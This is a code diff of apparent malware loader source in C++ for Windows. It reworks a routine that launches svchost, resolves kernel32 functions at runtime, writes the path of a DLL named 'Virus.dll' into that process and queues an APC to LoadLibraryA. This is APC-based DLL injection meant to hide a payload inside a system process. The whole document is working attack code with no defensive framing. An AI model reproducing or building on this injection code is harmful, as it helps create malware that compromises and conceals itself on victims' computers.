@@ -66,9 +66,12 @@ PROCESS_INFORMATION CreateSvchost()
 	return ProcInfo;
 }
 
-bool APCInjectDll(HANDLE pHandle,HANDLE ThreadHandle,AnsiString InjectDllPath)
+
+void InjectFunc()
 {
-	char* DllPath = InjectDllPath.c_str() ;
+
+	AnsiString CurPath = ExtractFilePath(Application->ExeName);
+	char* DllPath = AnsiString(CurPath + "Virus.dll").c_str() ;
 	DWORD DllPathLen = strlen(DllPath) + 1;
 
 	HMODULE Kernel32_Addr = (HMODULE)GetKernel32Mod();
@@ -96,19 +99,11 @@ bool APCInjectDll(HANDLE pHandle,HANDLE ThreadHandle,AnsiString InjectDllPath)
 	ULONG_PTR dwData
 	) = (DWORD (__stdcall*)(PAPCFUNC,HANDLE,ULONG_PTR))GetFuncAddr(Kernel32_Addr,"QueueUserAPC");
 
-	PVOID param = (PVOID)nVallocEx( pHandle , 0, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
-	if (!param) return false;
-	if (!nWPM(pHandle , param,(LPVOID)DllPath, DllPathLen, 0)) return false;
-	nAPC((PAPCFUNC)LoadLibraryA_Addr, ThreadHandle ,(DWORD)param);
-	return true;
-}
-
-
-void InjectFunc()
-{
-	AnsiString CurPath = ExtractFilePath(Application->ExeName);
 	PROCESS_INFORMATION Svchost_Info = CreateSvchost();
-	APCInjectDll(Svchost_Info.hProcess,Svchost_Info.hThread,AnsiString(CurPath + "Virus.dll"));
+	PVOID param = (PVOID)nVallocEx( Svchost_Info.hProcess , 0, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
+	if (!param) return;
+	nWPM(Svchost_Info.hProcess , param,(LPVOID)DllPath, DllPathLen, 0);
+	nAPC((PAPCFUNC)LoadLibraryA_Addr,Svchost_Info.hThread ,(DWORD)param);
 }
 
 int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, int)
